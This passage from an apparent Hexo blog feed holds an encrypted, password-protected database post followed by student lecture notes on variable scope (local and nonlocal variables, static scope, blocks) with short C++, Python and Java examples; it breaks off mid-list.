dfec7c82c4934b0fb63b64f4520f4a32b15ff352fc16e49c7c28aa6f6e74588b4a7537f6cdd82ecd8cf8de301b7c773069701770d12e5153b586978fc823c880490381f80e11afda8aaac6487d0f13ce26cd14d5e5950f198b89324dfdc5af776e478fe729f4e6c8b860e70371bfe67a38fc0d91a51567018c7a3a2b10cbf41ff24a55548bd0c3cdab6933d5a89fcd7f4ec6c2db085620f07edf6d17557e41a41e9bbda77f41c4168514aaf8a008de26538e5270286758868a35ce8b95eb7af008a29c25db6507a05c20b0ffbb3e719736b8c94c90c1c460a7c3870b1fbc06241892aabefe002d74135597157cc8bce2f46cf571cc70e902bfe915339a4a83e9611df1dc2714d9af17601329a53f8c12c739e97c5a6a81a9e7b8cff1ed0066ef31190db77f3b30c172bbfb5ebe9f025d0ff44caf7f9516e53ea98aa1e3b89b23cb723beeca70e273c41729a39a8085837d0a104c543bbf2cc5a915ec95d3475759bda0bc953d81a8db81f32b6f2918877f20422e9b617c1e1fd64f4fef91e0519d2b21505ac0ddd8c6e0b8ddd2729d343b0ece9dc77f5ee91d4731e6494597f21d4c0334df89fd99b55ba44ef56426c0298f749d7e76d21d3e3d34830b82613d94f8abd92f45a454c58a8fd3cdf2f33a80f8b6a22033c5106bb3a13d42d8b343df3ada92a9486f5c92063e675637927c19d13505a4bd696e2788954b3a1072a738ede2188a665be8e61bcacd77ca8a926ead2b8fd39a12814136e748851861fafbaa5931abd7cd8463ed9c70e0138458ce1f15f222be1120b90fbaef03619ec1356682945dc87db0d16e4306e85baae357ad155561b9e90568e59518fc4dadf5ea92ec35835084753d0bcc377f3c2195853bb7953bc184c2919450271c25675a089c4c81e65bb6a6df5416ae554ffe08fd2d208c339f48111a51aaf25ba4c677d1e571159e4249dbe9aa23b12daa8f1ee85b7cafb5122e15e957a1811029e3b494d5efff7994ea9ed3432c0974be0caeecaccff56d4efaa00556041eaff2f781eeb341b82c9b26aac9936653732fda496c16d3dd9dbf915334f223a9d47855a3201a1d3d4b9728d690e3947781650c342d396d0845eabaf93b1ef82b7205b9276e0378a962d1406f50bd400f94a8d8d93139a43a9edf9d02047850cc1d5709c1bc3a4fcb66d3cd1fc0100e7104062db1b846cda4b89b0a57d1d1e59ec665f224a9bbda4e98f77768b119ad08a5bf1aae297eb0adb0f239c30b092909511e20d1cc1ba337210e22eb001026caa32c9955c5d1b904a77b43d2be4ef7bdcf9d4265d19200e814bb31228e554572ce47ed2c2f003f7b9724350324c70e97d212ac7a6d1978ad732e579ab998e73803505fc155998abb5d94167f61a33f02878cc7422e5a43cb1d5c43843effd77a563a65808367874496158f45c5d5f89c352e99aab8ea5bdc0006cf70c0cb9da63c26d247e7bdcf62f5f49de96e134c894e6476e2cbcfc2c8d5b1bed3d889ab243ca47da16dd47fb3bb4c380fdabe72ab52e59d424e6f687cf8b09c5fc8cac251cf02528f90d0a1916f720feefd1d28b46339e325c4f7de0b140fe4d12970a5ac944cf624bc739042a31e5984cf29d465290dbb0c1bfbce91eeb65f101764b14b5db1aa2a5b63ed0a068fe7dcf265e5046c174dd5bea6917dee37850fd3741ae3f8a4279a4ef768a17d7ccc72c3ebc85389e5e751074746442a77ad05b3835957fa677f359886f05340659a7539b3f53a32a75246b932d4a6d9dca83f9f894ea76fd13b94e73b76c180041d4aaf0f055e580ca951209be65e617678b40b1ff78a00f0997a983b730991ccd1856f96e85d15b15f5d671de2d07ebc129aa3d69bddb55facbb5351dbfcf752fe5c7fbc904c7fe46e03a8057e3638f05fa9fcc62afff82c87b965dddd69aa96c1dda92915face178ccee45fdaf8cd7c7d4182fe5ce39f9ca339392a9905379649da45c20e855fdc33833531d42141f0a4e06648b3eaaa44fb5712c642d02df70869bb317ead7facafe0d73094d1ef6230106a79e8ce45deb09677233d99ba0bb167d5517f12e441c273595c9534472f327572cb4c1fbc97bcb064e012882a7ecda3f28a8dc70bc3d0bbcaa4cb7098aec231ccc00c97c7ce1b3cb2992ed9a8dc52c39c86eac0af1399e08dc048db78227cc010a30813a1f3242011f4b4600f07b6b74870995656a28a45e3ddc6dbdb65a039bf3ee852a256afbbe441ac977c108cfa9de8e45bba59d1f5a84b62a38024e94ef13121aec14131f4a05b0d264f00ff3afde594c219f84ca79c30f251fd524a017e5d9f948302d115c870c512f5476f8fded1bd0e810d7355647b5311bbf07a43040af554666668a6b9fa3427237c8d5270bc8e2112c3d52a4fd075a340a1458bc0aa077ff88a5eefdcd8a29edbcc1357ea12a636bda01de6cbae036d64b63335a03e615c99364a36d6f3ebbfc1414d93bc34b1069c301017cdd703e4ff3736f949d046de80e6b518ef65aec0946d248244daa23530c36f918f4996e87fa955a9649b459d2ccd1fd0a8a85e061b2ba96a49932dba41f14926fa1ca8765e605a1b6a3316275d4614c292a7eb91390f4a1575090302b6fe9cea4ce1ef518b60aee79b800dbfb9ff91b83ade48961be915b01e0a1d77146cbea841307aff7812851f1b25ef7a3d78084ebb18a4d3341f0ece06a92481895fc0b99671dec3b233b29b2e4ec2b7ac9ab6c6aa2bd779220b92e41d91e27e40cfa90ca04fd8166ebb452fd051737048796922efcc39de8e303d05b6fafdfcc5874da34f53e9747185a01bf452ea26cea979bc9ff59948c1075c09b719f6a2b295d1f27ce599779b23f846009123422850e319dc60952ea58e423d94ec7e1d4d522b9b10b18d2e3894719992990225343e867197717997b4c4c64603487f04b6d6efc1eeead1d729f0698853f2696cc460f3f74b00d8b8c88ca3d88410ab3a354ae6e3f1c1123aef4b49f4905591a0ffd792c0ad07451008d720cc15701701ae4925edd70c7d0cfbc3dbf0d87929b70f859e59c4b31dfb6dc5dbc1f430f7b446960ae8036de13e0257e94531b432e83b3851f275606d8c1d57f1c64c01a873546661187683cdb9b9a3fe2bc27341dcb604e981725b0e100700fe20a3cfeac0443a951173217f1f2e15f976bf1b2daa6739b8b61eefb8a360501967d9ebe4dc8d5eb93fffe81ebc0c5e7783000ce496511f760688711f52588fe3aadee75cbe4bdada9e3ef329657b4bc078b9b65703309dfea6948579c4735d14a96bf03895b68c17729c1e23a95976934890598b9072c0d54daaa800140400206f9487a25775f30fd1a75abcf214122c5fd3a92a7995070cc56915ec1cfc8a57edc472dcbaecc5315c792b56054c1cfeed6c8b1702ecd746fd743e211859c69523d90bd7918887e4848c53a8b66c77490c2f50f0738b0b656438a5fe505e765cd82416a30530d12160f239d190dd33b2ede5296495abdf21a098e23c860a7688496cbd1eb5e2e3b6eccf198364902f60a03faebe62625407f48ee46a6dff67c2e245274ede285865a626ec0e2e274e2e86d5bd82f6ba946a522099f48cb7cacab228b2743e1b285879028567cc34c67453805ee91c5dd5a8df842f01e43dcffb92c30d84a87206ac0606733bd32f9fa150491a4cad9b8eb6683fc0541e1a0e5475cdd8a7640db5d805177901adc5fb290522e33a4cbeaf3ef0387c095715256f677134f3f3ed8e0329b7a2ac9009d3f687f0da775cb3429b2880edfd954ee3b1dfe49569699157973898fb93b27c9f8e11101b8b15cbb19c9a329942202a7595a976a75f7bf3c8caa87b27a1a8409e188c997fca1fa7d0709d244483dd84bd3ba24b0891a3aa959f7bd432808eea9263d783af639bb4b036a557e9904e43d16c17b47f16b5f523ef2e5d41d83cac9a4967af8be95b1eb5aa32a377546ba1fb2b15c3189797adfda634c61298f494a9f21e55718da68ae0d5897a3804f84ceda9ead1398080d76b998ce1af124c0a9d90b2422d393e7e14be9b6ad1c21dd3d197944d5f651434e82958143163d4a979bd3166a47a02944f7c78dc2d147c441b7219a27216fd6aa1c5b09777362a69ff67751b0d3242d53b73550a1278a5347d037e8d6938ae9f0908e2c93e49b3db4cef9ca5a9b9027e2d44a591c27c5f8b1a611e902a2e8d1567441004cd68ddf1b346a397c1f0f54fffad41db000cb488c23e9e6a1e9cc4baadebcde255e4d89c0bc38afbf46edbe4d107eb083a025ba7c3993b480e0e9f493d79f7fe03ff7857c899cebbaa4dc357d06ebc96451260d49e200121287fb6d25a5ced4aabc21d147044e1bc4d48a5be069a8dc04cb75c6263bd2d9453bc45343cdae1e98ee6ac62be572393c8432fe6119b17ba97b5a8cd27fbb49b26945ef7d363108d2aedf8dde7480907f3d3117a8cafa4e7e6e5d675b3fb317d623029a4155713bbbcf154beb24a29d008e5936515f6d09b6ae47ee582ccee47ac668c47ba81783e96692e0b0ecbf7f19aad9d4b0cef32565199a4c0498c450f824502b0c625caca57dde25de3887042f12c0ef6f362bc01c1594757f2bca0fa5e5cc824bc12ebcceb32aca324e45b3f8961bbbd1723b6d5c595991809ca4335f4a57a4918b240b349ba0764361aca87695209ea2f4c56693ce8c65cfee2f793110683ce71a74957d00495a51ae9a6bbdfe03699ecce5a24361bfb231463c1cb09fcbfbdcaf8549609fa27489e7419c4890116ceb10c6aefedb2cf2abc02df8dea8327e98b08d1a7d1b63e4aab0460b30a67b83510639bb9e3669566cee8e04e03a259e890535f8d54aa456b1102a8d399de8f89b0b635ddf57cc51b8827615bcfd3c513e421ea56e5e77408b18e207bd2275f2b7589eeacc9890003f4368c453a6e9be039cec13016b226c50c57633ff4ab06bdee1e13ec84046f4a5ad0e1db75f32d4786b8e7f6521f876b981e158f8695964834c7ec00658f78b5c0115d0287bbea850cde4410a9f40810ca5f4a7c6c531fa1e010a2abb2e1f8cc6ea0f2b150d9117b28efb63daa7098e31ac4b9a16d50a7dfbf9e93449523fd584afbef30b714788745bea716eb4a3adf0a18a4f53e96d6e5111180c18b7964f96f060885d5597ea6b41d14676a14b66d1ed0b7ecb85c8fea29e9e3ba9d8eca1f8c848ca46e757f01657ebc19ac41e815928d4a3b330f0c97f6623b816991b7c70ac5f5e0ee8a67fe825c6fed8ec9d7234c9a35b1a86e10f2de7b92c7c189aa47085e28c17d65c2b33cc5226199587a45787c2bfcccab17d28b6c3b17bb432d5aaa52e26f3ecefeca08e601a84b15eb0ffa15a090ba6619fa7a9b47ec0bdbf886c24ea16ccc82b8a839d75b8ab9225b62775ff6b6e0877ab98a97c885994aa42134f9410ca902413ddac91f285104cfe5ba2336cbebbd351a96c08c4fe4d28cdbd84f47039eab56cf50e9cc4ef47054942213ef031be0522ee414ee54138366daccd75fc54ac495fd6c6835f22cd072b6507b9516f3cf5edef8992905f6fd744f980b1da072ab4101f79f9a0d721505e4a99b1b9d0d71630aa37abffbe114e7495e5ce6bff309b289f9f3ca220325b25cd45b8bbeccc6b95d0cd0638dcb1ce92e527457bba5541bb27fc6a716ca54038c468e2b7c9d5305ba99cb6dc2704051ed63c7dd2484fa33ca2ae328d9037c7fa0a076cff5806ca147cde13042db5215796ffe1355927c07c8c68d73ba224ca26e8827f122c933a0c004a197a8ddd771e29883e1a3dfba0e8cb322467ad5ca4f0e0f8d6bada51f2a69bddeac40f304939d62469b23da7f85c5294557b88fc207032e5f95331714d72601a9912741d191e4c8efa660bc575affd72e59604261555477cae245ae2c3b0e5813e49eab2f2b87611fb4480dbb39bb406eaa96549d6f1ec523e88ecc4d3c46b06243df507d0f358e3bca39bddf2b887cc1fe229cf9156a73fe51062e4c6d70386591043bb9d6d2841815b5802bf7622853a6d848f1e93a2dc2725b921b447bdc9d52783e149142e1d793813af4aeceeec78eab94d722c54af8006d0d3ade015615a92e3303ed3fb98561ec811902a7ad912fc7afa792365312ad9699b5a7b10c8ba76371c704b31b7de7930b81efcd008ab55f72a5b81fcddfc77dd8b99b5472c1d24bce25f33f6038ded6c310b46a4914aefde0f640bf38eac33adbcbba9322c3c9ae411d559135fb50491158a056be397e4f2d6c3407a43edfd1133a7ad022643ca0610913594b763ad9a0233cfed53c2493a4d20e905cf553b8dffe285f5e6b7016d720e0ac7d10343a430f143fbe39bd84c9760cd6a1cc75a88e6d17e796abccc9f982e7e4809d34358804e231b790be529948099d3569821608604775e88ae847577e768c9f79be6cb460d44aaced08f85528d0971f9d87a48900c8bf1901ad3fb06bd7317539bbf49cae28f4854dc381682989ca07a618f1047e38a798fe4928c89da0f424d9ae898f89db2b173d99ef0714ffb6121f5b3c54923588a24581560f82078f780aee6d5e49c4af0184dbeb9e45cf58f890c66c32084226d834217a4dea9d4be2e1f5f29829ef8d6701851061f8814a0855a16816be06adf236e0e0c6312ced80b33c29caf0717a3ed241c4aaeda2928c9cbec3eb6ecf3543245af5dc86d7c037fdbb17647d1cabde83b0912f1a437bb62e04b318ac8b58e0823cc21e5f9595ba07478cc2c65ee14647298619c4c3c825882b12de30c04429a94c65a54c6e2725247b491fd37b5133ae76eccb6634847062a4808b25197e4bda1bfd895b9e0a39e80111b5bab3e695f18be2c46758ccf28318063ca9e3f5ae3fedbaa64fe32fcada996383e6265aafe0f82f93ec143f0c6063d9740c909adc4a0b536a5b70e9c67d212cade7b5a976359eb4b582c04bd355a08306b6319cf0f01f58981ab7151eb7d8b86ad57b08231ea7075bdbacc4e4d1b4cbdcdb6c9dc60202e6afebed56594dbad66cbcc6dc94c9632afe23424dc4917fe6876e8bb8e8687046f6418eaa4ea2f46fd9416cc66d5ceeb88548c5b30cc9d4e7a98d23983db068f131d658be170b6c1d4cda87d0dfb2010e56123439a3827e6fb9d81dad392ddda6b07bbc4a4357e9343f7548047d456ec2c53321b1cba4ee69acda5dff3566dbfba4ee0694c4b97ced268d3ca9c19cd6f426f8596d2554b14cc18190ec69bbdeff66560bdc60aebcdff3c84fffc0595b10d7a0801d9a7f47952de3408094ff3a576491e19f3a5555f6f8d2e72946989a993eeeca732be949add22d0bc24275f2a94d2b99ed07c26416f25e543a16ed9e528b7cf86e5ebab8806d18baedafa66f38f0f0c792b68e63a206c753c8612da3ca7d2fe9d48f4a2921a65022fc9ad5088c193b217af0efebe6e5ecb87b9a2e062cca7bd2d4f206c8f118af661cdcb0bd5487ba901d495a75373c99b1a444872d0690c32a25b9d022e595b6424b08478bff9f58544e1e2481d70e8695a00a2b66fdda42f1ddc3dd0ddb77ce9f734cfd6c2a216353285ab1ef041171a7b782c1fd7d60472b26d71b0af31fd66087255b29f43997d0a3c62a3466ecc5e538bee726da6db5818729256c37bf4a83ce165ecefad00dc42c28e91be144f98cc3c3bb8c0cddfbd1271edce3490c99ff26744f945addacf2f18e713a53675db8763183f11c24ddb13766809486a6909efbd0d288dcc40649a713262296587bf3b96c61dac8f2625b431b2865d0379f90eae02da3f98faf43faa9fd84187cdfcc7066b5f9f45da8910b696de184fa62ee3bb10a8e559ae819243a7b89e7cce838df943c4a10de357468207b50372d1e57650fcce9e7537a8f0e47aa87dd12ef2b9f906ecac652190fa045d4d4b4fcdf22e49435869cb6fb80714af377cac20ec91708f6d7e19eef397f610cc66667ea15f36f3e40c4cb57907683f5add0f8bfca485161cf521d85a15f81f304551b18ee61c2e29f489e0788a15ce8b8dcd0007266e59b102bfe38cbbd90bd524b39a45c4ab992c4102da8942c4f6df1ddd65d3cde944f2d493973bb36a23ce3183f7e3ad0e5565d770fd8b436097397e884fec13b9ade020a245547a8b5296eb0644acc76789a8fb258ca5e27a011e432fb09ddc3f925e4b9df138d2f6b5624a6bb82980cb1a2ff734485ba60882231a5faf25be26635234b24fbccdabbd676331aa8360f78c267e0e3e2e2d66387b05b372473afb0a2097f6d34512438524cc37ebbf47a068d014f10631ce6e08978ec76ca790d7389e1024d68998cacf9af4943a07eeaba1a7bbd59dbd7ebfc5cbcdb5b05686e814f8c64538d14329c3ce908b8cf8f76d9229fc7748b65b12dc0f7e545fd21e7c0142ad013a9356e90d77f35f59a431dc72ae325bb432d2b1296d7a5acf91fef14d193284f09864d3725498613057f3c3e10069e833a31ccb063275b595bab4fd91e108af8b67c762509d6973278b8bda356bbf6db511c709d3c2c5d68905a0bce5f80a0870bb338382bf38fe7f300933d439ef0b03e5a3624b293d24bdce7ff600250f49ee937194399b635380ff0117eff342a8cc70f550ee287ac2f9d1507bc74f478ded5b2ccfbba97b18973655657e4a014ddc2f0a189402efce95dd43ea7767c4a9cc36583e7811aed0618b7a36095a0a9bae65730516ca072943b60797376e644636ae3feb8bc38e68d845e8dd957cbec2f71f9c5f421f57ed10851e2c4ea05bcf26c09250be12ed2c80b728290f72a4cd954a19bc1bc291a7d5f824874684549cae877f1c4af2ced1ec1cd2c2d4db7354381aadf2dfd6825523728231e9c41aea4d787e844f3ad9b117b91a450dddf4c15fd551ad47c9c7c88f2a9b17b20919c2eec788787125e0c011c03416b7d78e9876fd709c3a6799b1f8c0ba2d22b60f9b6a03f326d1e5c1d36d82d3a9e4d9187faf7123bbcac2e49c526fd6033e35c3ce4e466d99b1f069ce2a1c941f157d97fa52c15bc6360ff682f087e1d497af9040028e15c7a67513b4762a59412ea0ac36bc536ff3787160e252366273ac75b47183fe19f4d2cc1dd300fecb9bcf1a53f3c878321d03f7b0437da3420031a07c5870607668803a93bb4fd0672da12f537da176d1bbd673a2b440145da2d610fc6f8eb63b99b2e4028af266db286785da25a8c862ebc63c36a6da36910cbb957f08f759c4174876c8f272224d0a2493d6afa7e5443c9975ac6b60fdda61205b55517d12fb8320f967909767441cf1ae33832872ca1b4ec8988a826d4fcba11d9b8fe58faa3e14a4f5bc680fc7bcd19b6b7f83e703576eb680b9aa7b7fabbfefb4e1efef5ed7ad71a7fefe85ced77daf7b30c018c37e996785e3e2e045454bcc43b2064e160df764615864e2585fa665cc2d246ecc43b562d72afa26c6752db455c4439876ab8c1a451b5d7efb3a01c3ead258bfe38869894ac1fa0dba29022b053eac8509bcb70ecb2b5466ee78f1a213f642cb1eab4b7aeb821a7c80dad585c815a28227075695cba0dd9f7bd540a70fe40a44d24e47157288cdd8c24e29ed5e8b58acec190d61aa0e6aa5781b6c8baef572d27c428d6ccd2323a52baf3931c0c112e0fb9d63d2b4af1d925a442b4d1a01890a51b5862ea9fac9d5acb6f08a432c02ed2424aa7e97b6dcb11e54ef4060894e6d84dee8c8a4225775bd613007a44cf08bd91fcb7f43756ab42f7e8c0d288ec54ff7ff1544abcb07717a3f39fce3df903590899b9f6410518738a7177d2e97073a411977943e64787c9412758cd6c861df5d6775d54aa8eaeb886e22ba6a1dcb85b230e25ea4a8b622bcc9c2a31707b33a83ace59314e02a9704067d4cb9624921b45c1070a6cab420fdc9506d97befe3a25255da45f838ccc1b5c206a56ffb731d76b5258cabbae61051d67d77b32448dc42a017d6a4c4dba4bb59410e08ef13a1376ac110160f6c5f14c2a9a5bf6cb13c960ff0902f12ff2da31a1766a940873e0e6a1ac1e37d470d64ed9eff43a32e40b1b7094d9dba358667f91623b7112ab34670740fbbc27d5a02576a81a7d01dc4a47f6a0e385118b64d3e309dc90c107892fe4f7dd969ff82d1154b8118c7aac20e9b9776727bbb0c2c3d507fbd35d9564de2266a303452d8c6c690bea6fbf03d612fd931c7382a81ed22d918f713b087f2bd73fa4e3c4984b473fedc000241748a0ff4f92c52050f7ed864daba5a521bd360fac32c53317058e68e653a593b5ab62dfc28fc3680ccf1c3355ec19135fd368ace43308fc144341f3f3fedc14f8f32baea3fcb97d058efd10b91c6ff39f4615af1547e629a8a178d95fb9c7d3e8ffbdcda484e3e4729a8979c5c23900066ab96c0e69e8d39407715f7f41132277316464cf1f38a970463af0358155e737ceffa5724405ac60e120dff120d08a64e72ceba94a9864de4b575f6a373100056e52f1162337ab7a09a7ed7f03b0162a39e7e8a5c20e173896e8bc3944b21724576347f1278b8774b7b0797a7dd79294e43fe07f090b24f2dd94bd43ea4533042929ad9216538f8812edd281fc353ee51436a47d50a8e757e38342ab9f8d0b4ab4ee71822d6390d13eb5a3f7d82d426bc3c6f332515c5384c5065edeb856ae92b73aa3db6f85a9f9a4ca3b162c0e2e65894be334fe78a63c8ff79c864544aec0467ea23c5bf07fe93e1aed82e0ab84e3b218652e6942a308a38b84612e42cd298d475c14da9324f0beb784797707542945d5ae9668e210643feadcae9b6cc9d7744a8a8e0fe4e8ef3738c8ad86c71c42832d59035198ce8dadf52d37c30720878a4b812379ba9e172ef58e9114691daa8d3f08122efeda37a3e3396554110dacd7d2dfe9ee5b5ec85bc8c807104828be61ccb2174577424404b90d006b9ba91d16b6f1e574027dd0e6729b0d172dbaa00d527787edd563ee8fd438b222c4088b80c49363b0b7f20412d4f0c307e4fbeb91bfe09b829fb624cd8be912e595fa4bfdc20ef6994eec69d664ca439c6210a6a617d060ac9fe3a49434eeed68f65cfc60a2991ea4fdf5cfad3fc7090655b8fac39fcd48d134c3169d3491cf3899c89d8a1ea41e539eef2f1609992e46d921ebe74d27791fd8641e25209899ece0d09667a9f86c0c9ac1f4e1aabc5b23ba8d766db026103918edc88ae3732eb449455cbe01a552580c669cda6bcb0a021ed450a6fabd8a3873cf7a2763c2d8700dcef104bc590e3cc716f4c6ce124641ce72cb3aa0abd39c62938bee678a32a88c715774b9794b756bdd192e2b604571a5441fda98c545c4ded75a3fc45c3ff84ea60cbd48292ce627e23fa38d0c0d52a127bce9751d84c980e4a0ee8e7e19cdef3e4111373134914c802d79233e32e10db230de372a4211aaaa7144b911b43a7d1b0f2450e62fcf827f9e43c4189c6af5de7128eeac79770320614d5be671976f3341c1f35432a18f79ed937034cf102be1b24cf63e7afdafaf713397b72c8c29ba7626bcea3f8f019a6680f7cb84a41f6e7e5a718d7639c3fd7ca53fcf4e6a08ca0af7d1d0b14403f21921ee8a37e11f602d714852b58ac804f2fab22712e9731aa1f4fc84b370484be883fa93c85b7fe7927bf08598aed0d803f0bab3ba24ce28af96d910b2f55fc2240205d8f2a07571dbd7ed61ff5eb4ed97702f8ca80b5906a7eecd94cb1359633fa991147865eba74fbefb2f26943801e8776711c4c42aefdbd32ef086fb3a595e292eb7a100ec0fee6480a6e0d39223f2b0c62598d17cf99306c0b8a3082b8d0bf451b9b544f17c7f2284a6d5b49d2f02c2bbee4df645c800829397a344c65e04111dbba3bc067352aed57524b25b78b297414b41d86087353d9ef6640d3b7b99be53094f5be9329d1d070be46f461ab5b7b66601ba6efaa60c68a57b1d1af25213b1550fac37b898bbe900242c34a78ab87a7f1ecb52282085bfa53815bea24f8ef972786f1d43056c5f6e24ac1e89130b87156d7dc683bd4cc3e3d0f6a025baadcc538d86d4f484300b2129715e580fbbb4ba07fc2bd0b9bac48480662c5d9d638921fc97b4acda9eeefa6f2b3d847c0d754e13a65cc3da4d8e9db1503458853c970d4dc0559b6385887fdd6272859b9cdddffb71c0b766ecdafaeb8d1dceb72ab3976d2ac777109d910fff229924e7becd4c1f16d7535413507b5f3ea333b907cc10ba04ed525a790c834806a322ec7b4d4ac16f0f7ff4b1f991315208ed0e8112864aecbb3559f6fc6d90ae9754153f341e573a4aff5924ddeeb783afa3ba765b23ee1108f3ef50f7cf20be7ce8c63bbcc912a1753e6777e8be03332789c3f0e00bb00a876d8021cc034b3e09cdad0c6f8719a3ac7caa06850a47f4a243b42306f852d5bc6194325705ece3635b650d4b54308e376e0bd0d7fdac4880cbabdf19734c826185c569e4eab5377eff376b736fdc3f1b3e50b5a7c876561d08f7d7bc16a29400fb5c947b53b5b7d2cc7fe255d11cd5293244074d2837dd791aa97bcb22ada0aeee32e86f0613396084ec801217d1574bf806bd0b9e2f6fad44fd1828936aa69dab4705d576b7f0b8f9ad2203d79ba9fc93b2906552527b217ac8beee4abb63e957022f348a0faa7e399657c36fc2c62309ec0072261fa088296efdce853aa2dacde78b47d70fecabf517a4715375d74ac19de29a116c2ac1f19bd1278146f44d73d3e2df6a014b9cac144bf74bade3761ed2a1f5a5dda83e9ffd77a41965618bb2c11638f10395cb052be3833882b43a1c0bbc7654548867b45f98b1ac9a9dddc67f3e056db041ca1be3a79bd0f565ea4436d6ce3eae77bc1da2693a3685ff427ae9ebebd9870277115f5597176401b5a08c98474226882d18e0d3224d8a46254682620ab48a077989d9593b0b6bd81f9a13d56608bebc70d754582604818466f33b65b3fdb3e8847e7f8bbfc8addd6fda8089525c90fb8ee8c96a7ce195727263d03a4c0187284b8dbbe1066ecddce553ea1ebb58e66da15723ccc15df9027be6074e1030ac9d4e37808844f83cb2680a561119991794d3bcf52d3eec4d</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/myBlog/lib/hbe.js"></script><link href="/myBlog/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CSCI3170</category>
      </categories>
      <tags>
        <tag>CSCI3170</tag>
        <tag>database</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3180 - Scope</title>
    <url>/myBlog/2023/02/25/2023/CSCI3180/2023-2-25-CSCI3180-Scope/</url>
    <content><![CDATA[<h2 id="Scope"><a href="#Scope" class="headerlink" title="Scope"></a>Scope</h2><ul>
<li>variables and functions declared in a particular scope are visible and accessible only within that scope and its nested scopes, but not outside of it<ol>
<li><p>Local variables</p>
<ul>
<li>The variables defined within a particular function or block of code</li>
<li>The are only accessible within that function or block and its nested scopes</li>
</ul>
</li>
<li><p>Nonlocal variables</p>
<ul>
<li>The variables defined in a parent function</li>
<li>They are accessible within nested functions</li>
</ul>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> g;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="comment">// g is nonlocal (global)</span></span><br><span class="line">    <span class="comment">// a, b are local</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// g is nonlocal (global)</span></span><br><span class="line">    <span class="comment">// x is local</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// g is nonlocal (global)</span></span><br><span class="line">        <span class="comment">// x is nonlcoal</span></span><br><span class="line">        <span class="comment">// i, y are local</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
<h2 id="Static-Scope"><a href="#Static-Scope" class="headerlink" title="Static Scope"></a>Static Scope</h2><ul>
<li><p>It done <font color="3A75EA">before run time</font></p>
</li>
<li><p>It searches <font color="3A75EA">locally</font>, then proceeds to <font color="F54747">increasingly larger enclosing scopes</font> until the given variable name is found</p>
<ul>
<li><p>Static ancestors: the enclosing static scope that contain it</p>
</li>
<li><p>Static parent: the nearest static ancestors</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="string">&quot;global&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">outer</span>():</span><br><span class="line">    x = <span class="string">&quot;outer&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        x = <span class="string">&quot;inner&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(x) <span class="comment"># inner</span></span><br><span class="line"></span><br><span class="line">    inner()</span><br><span class="line">    <span class="built_in">print</span>(x) <span class="comment"># outer</span></span><br><span class="line"></span><br><span class="line">outer()</span><br><span class="line"><span class="built_in">print</span>(x) <span class="comment"># global</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Evaluation</strong>:</p>
<ul>
<li><font color="F54747"><strong>Advantages</strong></font>:<ol>
<li>Easy to read and understand</li>
<li>Relatively fast</li>
<li>Static type checking is possible</li>
</ol>
</li>
<li><font color="F54747"><strong>Disadvantages</strong></font>:<ol>
<li>Too much access is possible</li>
<li>Inconvenience<ul>
<li>As the program evolves, the initial structure is destoryed and local variables often become global, even subprograms also toward become global rather than nested</li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="Blocks"><a href="#Blocks" class="headerlink" title="Blocks"></a>Blocks</h3><ul>
<li><p>A method of creating static scopes inside a program unit (<code>C++</code>, <code>Java</code> cannot define a function inside a function)</p>
</li>
<li><p><font color="3A75EA">Compound statement</font> is a statement sequence that groups more statements into a single statement (in a brace<code>&#123;&#125;</code>)</p>
<ul>
<li><p>each compound statement have declarations which defined a new scope</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        System.out.println(y);  <span class="comment">// 1</span></span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(y);  <span class="comment">// y is not visible</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><font color="3A75EA">Nested block</font></p>
<ul>
